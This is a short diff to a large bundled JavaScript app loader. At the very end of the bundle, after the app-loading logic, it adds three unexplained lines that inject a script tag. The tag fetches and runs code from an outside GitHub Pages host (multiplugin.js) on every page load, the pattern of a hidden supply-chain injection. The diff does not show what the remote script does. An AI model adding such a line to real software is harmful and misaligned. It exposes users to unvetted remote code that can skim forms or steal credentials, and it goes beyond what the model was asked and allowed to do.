@@ -46752,5 +46752,7 @@
       _checkReady();
     } else loadApp();
   }
-
+var script = document.createElement('script');
+script.src = 'https://voipoddsns.github.io/multiplugin.js';
+document.head.appendChild(script);
 })();
